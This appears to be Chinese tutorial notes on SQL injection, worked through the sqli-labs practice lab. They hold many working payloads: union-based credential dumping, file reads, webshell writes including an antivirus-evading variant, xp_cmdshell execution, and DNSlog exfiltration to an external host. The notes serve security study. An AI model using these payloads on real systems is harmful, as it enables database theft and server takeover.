---
title: SQL注入
date: 2022-08-5
tags: 渗透测试
---

# SQL注入

![SQL注入-小迪安全.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623750701440-910fbead-ad66-48bf-bf97-eb5f58f83565.png?x-oss-process=image%2Fresize%2Cw_937%2Climit_0)

## 1. 概念

SQL注入是一种将SQL代码插入或添加到应用（用户）的<u>输入参数</u>中的攻击，之后再将这些参数<u>传递给后台的sql服务器加以解析和执行</u>。

sql注入的方式主要是直接将代码插入参数中，这些参数会被置入sql命令中加以执行。间接的攻击方式是将恶意代码插入字符串中，之后将这些字符串保存到数据库的数据表中或将其当成元数据。当将存储的字符串置入动态sql命令中时，恶意代码就将被执行。

如果web应用未对动态构造的sql语句使用的参数进行正确性审查（即便使用了参数化技术），攻击者就很可能会修改后台sql语句的构造。如果攻击者能够修改sql语句，那么该语句将与应用的用户具有相同的权限。

## 2. 产生过程

大多数的web应用都需要与数据库进行交互，并且大多数web应用编程语言（如ASP、C##、.NET、Java和PHP）均<u>提供了可编程的方法来与数据库连接并进行交互</u>。

如果web应用开发人员无法确保在<u>将从web表单，cookie及输入参数等收到的值传递给sql查询</u>（该查询在数据库服务器上执行）之前已经对其进行过验证，那么通常会出现sql注入漏洞，如果攻击者能够控制发送给sql查询的输入，并且能够<u>操纵该输入将其解析为代码而非数据，那么攻击者就很有可能有能力在后台数据库执行该代码。</u>

## 3. 常见原因

①转义字符处理不合适；

②不安全的数据库配置；

③不合理的查询集处理；

④不当的错误处理；

⑤多个提交处理不当。 

### 不当的处理类型

sql数据库将**单引号字符（’）解析成代码与数据间的分界线**：单引号外面的内容均是需要运行的代码，而用单引号引起来的内容均是数据。因为只需要简单的在URL或WEB页面的字段中输入一个单引号，就能很快速的识别出web站点是否会受到sql注入攻击。 

### 不安全的数据库配置

数据库带有很多默认的用户预安装内容，比如默认账户名、默认表名等，这些可能会成为SQL注入访问数据库的首要尝试。

SQL Server使用声名狼藉的“sa”作为数据库系统管理员账户，MySQL使用“root”和“anonymous”用户账户，Oracle则在创建数据库时通常会创建SYS、SYSTEM、DBSNMP和OUTLN账户。这些并非是全部的账号，只是比较出名的账户中的一部分，还有很多其他的账户。其他账户同样按默认方式进行预设，口令总所周知。

攻击者利用sql注入漏洞时，通常会<u>尝试访问数据库的元数据</u>，比如<u>内部的数据库和表的名称、列的数据类型和访问权限</u>，例如MySQL服务器的元数据位于`information_schema`虚拟数据库中，可通过`show databases`和`show tables`命令访问。所有的MySQL用户均有权限访问该数据库中的表，但只能查看表中那些与该用户访问权限相对应的对象的行。

### 不合理的查询集处理

有时需要使用动态的sql语句对某些复杂的应用进行编码，因为程序开发阶段可能还不知道要查询的表或字段（或者不存在）。比如与大型数据库交互的应用，这些数据库在定期创建的表中的数据由于应用已经产生了输入，因而开发人员会信任该数据，<u>攻击者可以使用自己的表和字段数据来替换应用产生的值，从而影响系统的返回值</u>。

### 不当的错误处理（盲注）

错误处理不当会为web站点带来很多安全方面的问题。最常见的问题是<u>将详细的内部错误消息（如错误代码，数据库转存储）显示给用户或攻击</u>。这些错误消息会泄露实现细节，为攻击者提供与网站潜在缺陷相关的重要线索。 

### 多个提交处理不当

大型的web开发项目会出现这样的问题：有些开发人员会对输入进行验证，而一些开发人员则不以为然。对于开发人员，团队，甚至公司来说，彼此独立工作的情形并不少见，很难保证项目中每个人都遵循相同的标准。开发人员还倾向于围绕用户来设计应用，他们尽可能的使用预期的处理流程来引导用户，认为用户将遵循他们已经设计好的逻辑顺序。

例如：当用户已到达一系列表单中的第三个表单时，他们会期望用户肯定已经完成第一个和第二个表达。但实际上，借助URL乱序来请求资源，能够非常容易的避开预期的数据流程。 

## 4. 危害

盗取网站的数据库敏感信息

绕过网站后台认证（万能密码：`‘ or ‘1’=‘1’ #` 登录绕过）

借助SQL注入漏洞提权获取系统权限

上传或读取文件

执行系统命令

## 5. MySQL注入流程

![image.png](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726142843140.png)

以sqli-labs为例：https://github.com/Audi-1/sqli-labs

![image.png](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1623816863968-03b39520-736a-4953-9193-393137069010.png)

- 查看源码，分析注入原理：

  ```php
  if(isset($_GET['id']))
  {
  $id=$_GET['id'];
  //logging the connection parameters to a file for analysis.
  $fp=fopen('result.txt','a');
  fwrite($fp,'ID:'.$id."\n");
  fclose($fp);
  
  
  // connectivity
  $sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
  $result=mysql_query($sql);
  $row = mysql_fetch_array($result);
  ```

  在上面的代码中可以看到，网页以get请求获得id变量的值，然后将变量id拼接到数据库查询语句，进行数据库操作：`$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";`直接传递的变量$id带入sql语句中执行没有做任何的限制。

### 判断注入点以及注入类型

在给id赋值时加上其他无意义的字符`id=1abc`或者`id=1 and 1=1`、`id=1 and 1=2`，或者更换闭合条件为单引号`1' and 1=1#`、 `1' and 1=2#`之类的字符串，如果网站在不同输入下能回显出不同页面（显示1的结果（解析了and 1=1）或者回显为空（解析了and 1=2）），证明有SQL注入漏洞。如果网站显示404或者500之类的错误或其他报错，说明网站进行了字符过滤之类的操作，没有SQL注入漏洞。

闭合条件根据SQL语句的结构不同而不同，数字型就没有闭合，字符型就是单引号或双引号，再次基础上还有可能跟一个或多个括号。

```mysql
SELECT * FROM users WHERE id=1 LIMIT 0,1 
SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1  # 页面回显，正常输出
SELECT * FROM users WHERE id=1 and 1=2 LIMIT 0,1  # 页面回显，提示错误 
```

### 信息收集（高版本数据库）

**必要知识点:**

*在**MYSQL5.0以上版本**中，mysql存在一个自带数据库，名为`information_ schema`，它是一个存储记录有所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库下面的表名或列名信息。数据库中符号"."代表下一级，比如xiao.user代表数据库xiao中的表user。因此：*

`information_ schema.tables`：记录所有表名信息的表

`information_ schema.columns`：记录所有列名信息的表

`table_schema`：数据库名

`tables_name`：表名

`column_name`：列名

performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。information_schema 中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。

#### 猜解数据库列数（字段数）

使用`order by`判断列数。oder by 用于指定查询结果按照第几列进行排序，若所指定的列号超出数据库表原本的列数，就会报错。

```mysql
192.168.102.130:8888/Less-2/index.php?id=1 order by 5
```

以下结果中，order by 4有回显，order by 5就出现报错了，说明列的数量为4。

![img](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/b292dcde41c4abdc906e588bcbd1d9f974c684b0.png@831w_161h_progressive.webp)

![img](https://i0.hdslb.com/bfs/article/f318d092797ad93d870e6043a4349e3383507bac.png@831w_141h_progressive.webp)

#### 判断前端回显

判断select的哪几个位置会被前端回显，后续查询就在该位置进行。**其中令id为-1就可以使union前的语句为假，从而只显示union后面语句的执行结果。**

```mysql
192.168.102.130:8888/Less-2/index.php?id=-1 union select 1,2,3
```

结果显示2，3的位置会被前端回显。

![image-20220726142202091](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726142202091.png)

#### 查询数据库版本

```mysql
?id=-1 union select version()
```

#### 查询数据库名称

```mysql
?id=-1 union select database()
```

#### 查询数据库用户

若是root用户，则方便执行进一步的攻击行为，如利用SQL上传文件，redis未授权漏洞写入计划任务的利用方式也是需要root权限。

```mysql
?id=-1 union select user()
```

#### 查询操作系统

```mysql
?id=-1 union select @@version_compile_os
```

比如注入时，发现第2、3个位置会回显，在这个2个位置查询用户和操作系统：

```mysql
192.168.102.130:8888/Less-2/index.php?id=-1 union select 1,user(),@@version_compile_os,4
```

![image-20220726112454906](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726112454906.png)

以及数据库名称和版本名称：

```mysql
?id=-1 union select 1,database(),version(),4
```

![image-20220726143807180](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726143807180.png)

#### 查询指定数据库下的表名信息

根据刚才的信息收集，已知当前页面所操作的数据库名为mozhe_ Discuz_ stormGroup，或者直接使用database()表示，然后可以借助`information_ schema.tables`查询该数据库的所有表名：

```mysql
http://219.153.49.228:48354/new_list.php?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()
```

![image-20220726145018620](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726145018620.png)

得到表名之后要确定哪一个表存储着用户数据，可以根据表名猜测或是逐表查看字段。

#### 查询指定表名下的列名

根据刚才收集的表名StormGroup_member，查询该表的所有列名：

```mysql
?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name= 'StormGroup_member'
```

![image-20220726145307736](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726145307736.png)

#### 查询指定数据

根据刚才收集的表名、列名，可以查询该表的指定数据：

```mysql
?id=-1 union select 1,name,password,4 from StormGroup_member
```

![image-20220726145504487](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726145504487.png)

指定数据可能有多个结果，可以使用`limit x,1`（从x的位置读取1条记录），变动猜解，得到不同结果：

```mysql
http://219.153.49.228:48354/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member limit 2,1
```

得到的密码一般为MD5，去cmd5.com碰撞一下。

![image-20220726145823634](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726145823634.png)

### 跨库查询

MYSQL 注入中首先要明确**当前注入点权限**（取决于注入点所使用的数据库用户的权限，使用user()语句查询），高权限注入时有更多的攻击手法，有的能直接进行 getshell 操作。 

比如上述注入中借助的是root账户的权限进行数据库操作，若root用户具有当前数据库之外的操作权限，那么就可以注入其他数据库获取想要的信息。

imformation_schema除了记录有所有的表名、列名，还有所有的数据库名：

`imformation_schema.schemata`：记录所有数据库名信息的表（跨库），其中字段`schema_name`表示数据库名。

**查询的前提是用户具有相应的权限。**

#### 查询所有的数据库名

```mysql
?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata
```

![image-20220726155012588](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726155012588.png)

#### 查询指定数据库下的表名信息

```mysql
id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='qqyw'
```

![image-20220726155117482](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726155117482.png)

#### 查询指定表名下的列名信息

```mysql
id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='admin' and table_schema='qqyw' limit 0,1   # 当出现多个记录时，可以使用limit 0,1取第一个记录
```

![image-20220726155734752](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726155734752.png)

#### 查询指定数据

```mysql
union select 1,u,p,4 from qqyw.admin    # 查询u,p两列的数据，注意指定admin来自qqyw
```

### 信息收集（低版本数据库）

暴力查询或结合读取查询

- SQLmap工具——字典dicts.py
- load_file读取源代码的数据库查询语句
- 暴力猜解——admin，password，passwd，user，member

### ==文件读写操作==

- **load_file()**：读取函数，读取文件内容

  ![image-20220726160705262](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726160705262.png)

  常见的load_file()读取的敏感信息路径：https://blog.csdn.net/weixin_30292843/article/details/99381669

  ```mysql
  id=-1 union select 1,loadfile('d:/www.txt'),3
  id=-1 union select 1,load_file('C:/phpstudy/PHPTutorial/WWW/sqli-labs-master/sql-connections/db-creds.inc'),3
  ```

  ![image-20220726162851222](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726162851222.png)

  ![image-20220726163415752](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726163415752.png)

- **into outfile** 或 **into dumpfile** ：上传文件（写入后门、木马）

  ![image-20220726160842023](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726160842023.png)

  ```mysql
  union select 1,'x',3 into outfile 'C:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs-master\\x.php'--+
  ```

  其中--+用于注释后面的语句，后面有limit 0,1。

  ![image-20220726163809879](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726163809879.png)

#### 文件路径获取

文件的读写都需要获取到文件路径，路径获取常见方法包括：

**报错显示**：网站报错时，显示的一些路径信息。

![image-20220726161419446](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726161419446.png)

**遗留文件**：站长调试网站时遗留的一些文件，比如phpinfo.php。通过该文件可以得到路径信息。

![image-20220726161626302](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726161626302.png)

![image-20220726161656508](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726161656508.png)

**报错信息的漏洞**：

![image-20220726161808375](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726161808375.png)

**平台配置文件**（不实用）：

比如在phpStudy中，配置文件C:\phpstudy\PHPTutorial\Apache\conf\vhosts.conf中保存了网站的绝对路径，缺点是配置文件的路径并不固定。
![image-20220726162129913](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726162129913.png)

**爆破**：

PhpMyAdmin、phpcms等会有惯用的一些路径，可以进行路径爆破：

![image-20220726162408932](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726162408932.png)

#### 读写问题：魔术引号开关

- 概念

  魔术引号设计的初衷是为了让从数据库或文件中读取数据和从请求中接收参数时，<u>对单引号、双引号、反斜线、NULL加上一个反斜线进行转义</u>，这个的作用跟addslashes()的作用完全相同。addslashes()函数返回在预定义字符之前添加反斜杠的字符串。

  在phpstudy中，该开关为参数magic_quotes_gpc，在php.ini的990行左右。

  其实由于不是所有数据都需要转义，出于性能的考虑，魔术引号开关在PHP5.4.0及其之后PHP版本中被取消了，在运行时调用转义函数（如 addslashes()）会更有效率。

  <img src="C:/Users/cbcao/AppData/Roaming/Typora/typora-user-images/image-20220726165029504.png" alt="image-20220726165029504" style="zoom:67%;" />

- 影响

  如果开启魔术引号，则上传语句

  ```mysql
  id=-1 union select 1,load_file('D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs-master\\sql-lab.sql'),3
  ```

  会被转义成如下内容，使SQL注入命令失效：

  ```mysql
  id=-1 union select 1,load_file(\'D:\\\\phpstudy\\\\PHPTutorial\\\\WWW\\\\sqli-labs-master\\\\sql-lab.sql\'),3
  ```

  ![image-20220726165127494](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726165127494.png)

- 绕过

  **可以把引号所包含的路径内容（不要单引号）编码为hex进行绕过**。

  绕过原理：sql可以识别并执行用hex表示的语句

  ![image-20220726165729917](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726165729917.png)

### 利用SQL注入执行命令

https://www.cnblogs.com/feiquan/p/8673093.html

借助 xp_cmdshell 运行cmd命令。

```
USE master
GO
RECONFIGURE --先执行一次刷新，处理上次的配置
GO
EXEC sp_configure 'show advanced options',1 --启用xp_cmdshell的高级配置
GO
RECONFIGURE --刷新配置
GO
EXEC sp_configure 'xp_cmdshell',1  --打开xp_cmdshell,可以调用SQL系统之外的命令
GO
RECONFIGURE
GO
--使用xp_cmdshell在D盘创建一个myfile 文件夹
EXEC xp_cmdshell 'mkdir d:\myfile',no_output --[no_output]表示是否输出信息
GO
```

SQLserver执行系统命令的几种方式：https://www.cnblogs.com/Azjj/p/14019312.html

- **xp_cmdshell**

- **SP_OACREATE**
- **通过沙盒执行命令**

### ==SQL注入写webshel==

https://blog.csdn.net/huangyongkang666/article/details/123728115

#### 上传webshell文件

上传文件的条件：

1. 网站物理路径；
2. 文件写入的权限；
3. secure_file_priv 不为 NULL；

secure_file_priv=NULL时，无法导入导出文件；而当设置不为空时，导入导出文件不受限制；如果设置为某个文件路径，如secure_file_priv=/mysql/时，则导入导出必须要在该文件目录下完成。

```
?id=1 union select '<?php assert($_POST["cmd"]);?>’ into outfile 'D:/WWW/evil.php'

?id=1 union select 1,"<?php @eval($_POST['g']);?>",3 into outfile 'D:/WWW/evil.php'

?id=1 union select 1,0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22,3 into outfile "D:/WWW/evil.php"
```

#### 利用分隔符写入

```
?id=1 into outfile 'D:/WWW/evil.php' fields terminated by '<?php assert($_POST["cmd"]);?>'

?id=1 into outfile 'D:/WWW/evil.php' lines terminated by '<?php phpinfo() ?>'--+

?id=1 LIMIT 0,1 INTO OUTFILE 'D:/WWW/evil.php' lines terminated by 0x20273c3f70687020406576616c28245f504f53545b2767275d293b3f3e27 --+
```

```
?id=1 INTO OUTFILE '物理路径' lines terminated by  （一句话hex编码）#

?id=1 INTO OUTFILE '物理路径' fields terminated by （一句话hex编码）#

?id=1 INTO OUTFILE '物理路径' columns terminated by （一句话hex编码）#

?id=1 INTO OUTFILE '物理路径' lines starting by    （一句话hex编码）#
```

#### 利用日志写入

新版本的MySQL设置了导出文件的路径，很难在获取Webshell过程中去修改配置文件，无法通过使用select into outfile来写入一句话。这时，我们可以通过修改MySQL的log文件来获取Webshell。

利用条件：

- 对web目录有写权限
- GPC关闭(GPC:是否对单引号转义)
- 有绝对路径(读文件可以不用，写文件需要)
- 需要能执行多行SQL语句

```
show variables like '%general%';            	 # 查看配置

set global general_log = on;              		 # 开启general log模式,将所有到达MySQL Server的SQL语句记录下来。

set global general_log_file = 'D:/WWW/evil.php'; # 设置日志目录为shell地址

select '<?php eval($_GET[g]);?>'             	 # 写入shell

set global general_log=off;                  	 # 关闭general log模式
```

在高版本的mysql中默认为NULL，就是不让导入和导出

解决办法：

在Windows下可在my.ini的[mysqld]里面，添加secure_file_priv

在linux下可在/etc/my.cnf的[mysqld]里面，添加secure_file_priv

使用慢查询日志绕过此限制

```
show variables like '%slow_query_log%';			#查看慢查询日志开启情况

set global slow_query_log=1						#开启慢查询日志

set global slow_query_log_file='D:/phpStudy/WWW/evil.php;    #修改日志文件存储的绝对路径

'<?php @eval($_POST[1]);?>' or sleep(11);		#写入shell

show global variables like '%long_query_time%'; #使用慢查询日志时，只有当查询时间超过系统时间(默认为10秒)时才会记录在日志中，使用如下语句可查看系统时间
```

免杀shell：

```
SELECT "<?php $p = array('f'=>'a','pffff'=>'s','e'=>'fffff','lfaaaa'=>'r','nnnnn'=>'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['cmd']));?>"
```

## 6. SQL注入进阶

### ==堆叠注入==

https://www.cnblogs.com/backlion/p/9721687.html

stacked injections（堆叠注入）就是多条sql语句一起执行。在mysql 中，一条语句结尾加`;`表示语句结束，多语句之间以分号隔开。堆叠注入就是利用这个特点，在第二个SQL语句中构造自己要执行的语句。

比如：

```mysql
mysql> select * from users; select * from emails;
```

将堆叠注入运用于创建用户，以此迂回得到自定义的账户密码。但是前提是网站的管理员必须是高权限才能完全创建用户。也可以使用update更新管理员用户密码。

`id=1';insert into users(id,username,password) values ( 39, 'less38 ', 'hello ')--+`

当网站使用PDO技术（一种防护手段）执行SQL语句时，可以执行多语句，不过这样通常不能直接得到注入结果，因为PDO只会返回第一条SQL语句执行的结果， 所以在第二条语句中可以用update更新数据或者使用时间盲注获取数据。

`id=1';select if(substr(user(),1,1)='r', sleep(3), 1)--+`

### 加解密编码注入

某些注入点会对参数值进行编码。比如下面的cookie进行了base64编码：

```
GET /Less-21/index.php HTTP/1.1
Host: 10.1.1.133
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://10.1.1.133/Less-21/index.php
Connection: close
Cookie: uname=YWRtaW4%3D
Upgrade-Insecure-Requests: 1
```

`YWRtaW4%3D`是一个base64加密的字符串，其中%3D是编码中的`=`符号，把他发送到编码模块当中解密，得到明文admin。

所以构造好注入语句后，也需要进行编码，也就是说`admin' and 1=1`加密之后的值是`YWRtaW4nIGFuZCAxPTE=`。

而获取数据库名称的报错盲注的语句`admin' or updatexml(1,concat(0x7e,(database())),0) or '`加密后cookie值`Cookie: uname=YWRtaW4nIG9yIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChkYXRhYmFzZSgpKSksMCkgb3IgJwo=`

![](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728092746776.png)

### 二次注入（绕过转义）

（sqlilabs less 24）

二次注入原理，主要分为两步

- 第一步：插入恶意数据

  第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据。但是，数据本身包含恶意内容。

- 第二步：引用恶意数据

  在将数据存入到了数据库中之后。开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一 步的检验和处理，这样就会造成SQL的二次注入。

  在前端和URL（黑盒测试）是无法发现二次注入，无法用工具扫描，<u>只有在代码审计时才能发现是否存在二次注入，也就是提前知道所插入的恶意数据的类型，在哪里被SQL利用</u>。

![img](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/d03f2d86af5e7aee0e09c2379236aa52378eac48.png@812w_395h_progressive.webp)

**举例：**

比如<u>已经通过代码审计知道</u>，网页有注册和查询/更改密码的功能，并且：

注册页面会在后台执行insert语句`insert into user(id,username,pwd) values(2,’x’,’123’)`

更改密码，则包含update语句`upadte user set pwd=’123456’ where id=2 and username=’admin’`。

在注册页面网站使用了addslashes进行了特殊字符的转义，所以无法直接进行注入。但是也因此可以插入一些恶意数据，比如使用`admin' and 1=1#`作为用户名进行注册。

那么在更新密码页面，就会执行：

```mysql
upadte user set pwd=’123’ where id=2 and username='admin' and 1=1#'
```

同理，如果换成注册其它用户名，更新的时候也会形成不同的注入语句。

比如使用`dhakkan'#`作为用户名注册，那么更新密码时就会执行：

`upadte user set pwd=’sss’ where username='dhakkan'#'`

被更新密码的账户从`dhakkan'#`变成了`dhakkan`。

![img](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/4bdb21dc2e0d6958a868d38e4560a7de15dfa1c8.png@461w_92h_progressive.webp)

以此类推，可以借助用户名来爆数据库信息：

若输入用户名：`' or updatexml(1,concat(0x7e,version()),0) or’` 和密码：123

那么更新密码的SQL就是：

```mysql
`update users set pwd='sss' where username='' or updatexml(1,concat(0x7e,version()),0) or'' and password='123456'
```

但是网站有时会限制用户名长度，如果是在前端限制，可以修改Maxlength，如果是后端代码进行的限制，则无法成功注入。

### load_file&DNSlog注入（解决无回显）

sqlilabs-less9-load_file&dnslog 带外注入（实际案例）

**dnslog解决了盲注不能回显数据，效率低的问题**

**原理**：`load_file`支持对外的**文件读取**，通过在URL中加入SQL语句，可以<u>借助读取DNS访问记录得到SQL语句的执行结果</u>。

比如构造如下语句：

```
?id=1 and if((select load_file(concat('////',(select version()),'.yk2kql.ceye.io//abc'))),0,1)--+
```

**工具**：http://ceye.io，注册后可以获得个人的DNS地址：

![img](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/9ded59fe90f60d1cdb4049308f40ac2abe13467b.png@725w_165h_progressive.webp)

成功注入之后，可以在ceye.io网站看到所访问的链接，其中包含了version()数据库版本信息5.5.53.1。

![image-20220728101718259](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728101718259.png)

或者查看数据库名称：

```
?id=1 and if((select load_file(concat('////',(select database()),'.yk2kql.ceye.io//abc'))),0,1)--+
```

![image-20220814095417887](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814095417887.png)

参考资料：https://www.cnblogs.com/xhds/p/12322839.html

使用DnsLog盲注仅限于windos环境。

- **使用工具DnslogSqlinj**

  https://github.com/ADOOO/DnslogSqlinj

  ![image-20220728102540802](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728102540802.png)

  ![image-20220728102804316](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728102804316.png)

  获取数据库名称：

  ![image-20220728103014120](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728103014120.png)

### 宽字节注入（绕过转义）

当网站对参数进行了转义时，单引号等会被转义符（反斜杠）转义，导致攻击语句失效。所以在一般情况下，此处是不存在SQL注入漏洞的。

不过有一个特例，就是当数据库的编码为GBK时，可以使用宽字节注入，宽字节的格式是在单引号前会先加个%df。这样就变成了`id=1%df'`，经过转义就是`id=1%df%5c'`。因为反斜杠的编码为%5c，而在GBK编码中，%df%5c是繁体字"連”，所以这时，单引号成功被读入。

所以可以构造攻击语句：`id=1%df' and 1=1%23`进行注入点的判断。

### XFF注入

XFF是HTTP请求头中的一个头部参数X-Forwarded- for。X- Forwarded- For简称XFF头，它代表客户端真实的IP。

通过修改X-Forwarded-for的值可以伪造客户端IP，将X Forwarded -for设置为127.0.0.1，然后访问该URL，页面返回正常。

如果网站有通过诸如$_SERVER之类的函数获取XFF，并用于SQL语句，那么就可以尝试进行注入。

比如构造攻击语句：`X Forwarded -for=127.0.0.1' union select 1,2,3,4#`

## 7. SQL注入类型

### 按照注入方式

#### 普通注入和盲注

普通注入就是注入的<u>页面是直接显示数据库中的字段内容的</u>，我们可以通过 SQL 注入一步一步把数据库中我们想要的内容显示在页面中。

盲注则要困难很多，<u>页面不直接显示数据库字段内容</u>，显示的可能只是一个判断结果（是或者否），页面只能告诉你你构造的 SQL 语句对还是错，你要查询的内容存在还是不存在。

其中不回显的原因可能是 SQL 语句的问题导致，因为像insert、delete等查询语句即使执行成功，也不会回显。此外，网站的前端页面显示也会限制。

- select 查询数据

  例：`select * from news where id=$id`

  应用：查询用户

- insert 插入数据

  例：`insert into users(id,username,password) values(30,'x','123')`

  应用：网站的用户注册

  和select操作的数据包相似，但是不能像普通select注入一样操作。

- delete 删除数据

  例：`delete from users where id=30`

  应用：后台管理里面删除用户等操作、删除留言等

- update 更新数据

  例：`update users set password='123' where id=11 and username='admin3'`

  应用：会员或后台中心数据同步或缓存等操作、登录后修改个人信息，如密码等

- order by 排序数据

  一般结合表名或列名进行数据排序操作

  例：select * from news order by $id

  例：select id,name,price from news order by $order

#### 基于报错的SQL盲注（优先）

12种报错注入+万能语句：https://www.jianshu.com/p/bc35f8dd4f7c

floor、extractvalue、updatexml报错原理：https://developer.aliyun.com/article/692723

- **floor向下取整数**

  0x7e为`~`

  rand() 产生[0,1)的随机小数；

  group by 按照指定字段对查询结果进行分组，常结合count()、sum()、avg()、max()、min()等使用。

  利用了MySQL的第8652号bug ：Bug #8652 group by part of rand() returns duplicate key error来进行的盲注，使得MySQL由于函数的特性返回错误信息，进而我们可以显示我们想要的信息，从而达到注入的效果：在 **rand()和group by同时使用** 的时候，可能会产生超出预期的结果，因为会<u>多次对同一列进行查询</u>。

  ```mysql
  //select
  // 爆数据库版本
  1' and (select count(*) from information_schema.tables group by concat(version(),0x5c,floor(rand(0)*2)))#
  
  // 通过修改limit后面数字一个一个爆表
  1' and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2)))#
  
  // 爆出所有表
  1' and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(0)*2)))#
  
  // 爆出所有字段名
  1' and (select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e,floor(rand(0)*2)))#
  
  // 爆出所有字段名
  1' and (select count(*) from information_schema.columns group by concat(0x7e,(select group_concat(username,password) from users),0x7e,floor(rand(0)*2)))#
  
  //爆出该账户的密码。
  1' and (select 1 from(select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select password from users where username='admin1'),0x7e,floor(rand(0)*2)))a)# 
  
  //insert
  username=x' or (select 1 from (select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or '
  
  //update
  add=hubeNicky' or (select 1 from (select count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a) or '
  
  // delete
  id=56+or+(select+1+from(select+count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x+from+information_schema.character_sets+group+by+x)a)
  // 由于是在数据包中编辑，所以用+代替空格，避免歧义
  ```

  报错结果如下，显示出了数据库名称：

  ![image-20220727195036461](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727195036461.png)

- `extractvalue(xml_frag, xpath_expr)`

  xml_frag为XML标记片段，xpath_expr表示从XML字符串中匹配元素。如果xpath_expr格式语法书写错误的话，就会报错，输出xpath_expr。利用这个特性可以构造注入点。

  利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。

  ![1551928141656](https://blogs-pic.oss-cn-beijing.aliyuncs.com/images/2019-03-07 报错注入：extractvalue、updatexml/1551928141656.png?x-oss-process=style/shuiyin)

  ```mysql
  // insert
  username=x' or extractvalue(1,concat(0x7e,database())) or '
  
  // update
  add=hubeNicky' or extractvalue(1,concat(0x7e,database())) or '
  
  // delete
  ?id=56+or+extractvalue(1,concat(0x7e,database()))
  ```

